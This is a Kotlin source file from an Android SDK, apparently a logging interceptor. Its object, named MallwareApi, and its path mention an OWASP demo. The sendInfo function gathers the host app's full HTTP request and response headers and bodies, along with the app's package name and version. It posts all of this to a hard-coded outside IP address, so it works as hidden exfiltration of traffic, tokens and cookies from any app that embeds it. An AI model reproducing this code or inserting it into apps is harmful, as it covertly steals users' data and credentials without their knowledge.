package com.interceptor.logger.sdk.apis

import android.content.Context
import android.content.pm.PackageManager
import okhttp3.Headers


object MallwareApi {
    private val apiRests: ApiRests = ApiRests()

    fun sendInfo(
        context: Context,
        method: String,
        url: String,
        reqHeaders: Headers,
        reqBody: String,
        resHeaders: Headers,
        resBody: String
    ){
        val apiUrl = "http://172.20.189.242:4321/mallware/owasp-demo/api/v1/record"

        val reqHeadersString = StringBuilder()

        for(item in reqHeaders.names()){
            reqHeadersString.append("$item: ${reqHeaders.get(item)},")
        }

        val resHeadersString = StringBuilder()

        for(item in resHeaders.names()){
            resHeadersString.append("$item: ${resHeaders.get(item)},")
        }

        val reqBodyString = reqBody.replace("\"","\\\"")
        val resBodyString = resBody.replace("\"", "\\\"")


        var version = ""
        try {
            val pInfo = context.packageManager.getPackageInfo(context.packageName, 0)
            version = pInfo.versionName
        } catch (e: PackageManager.NameNotFoundException) {
            e.printStackTrace()
        }

        val jsonData =
            """{
                  "application": "${context.packageName}",
                  "version": "$version",
                  "server": "$method $url",
                  "request": "$reqBodyString",
                  "response": "$resBodyString",
                  "headersReq": "$reqHeadersString",
                  "headersRes": "$resHeadersString"
            }"""
        apiRests.post(apiUrl, jsonData)
    }
}